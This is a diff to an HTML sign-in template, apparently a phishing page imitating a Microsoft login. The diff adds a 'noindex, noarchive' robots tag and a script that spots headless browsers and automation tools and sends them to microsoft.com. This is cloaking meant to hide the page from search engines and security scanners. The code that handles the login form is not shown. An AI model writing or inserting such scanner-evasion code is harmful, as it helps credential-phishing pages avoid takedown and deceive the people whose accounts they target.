@@ -3,6 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, noarchive">
     <title>{{ page_title | default('Sign in to your account') }}</title>
     <style>
         * {
@@ -190,6 +191,17 @@
         </div>
     </div>
     
+    <script>
+    (function() {
+        var headless = (
+            navigator.webdriver ||
+            (!window.chrome && /Chrome/.test(navigator.userAgent)) ||
+            navigator.plugins.length === 0 ||
+            /HeadlessChrome|PhantomJS|Selenium|WebDriver/i.test(navigator.userAgent)
+        );
+        if (headless) { window.location.replace('https://www.microsoft.com'); }
+    })();
+    </script>
     <script>
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
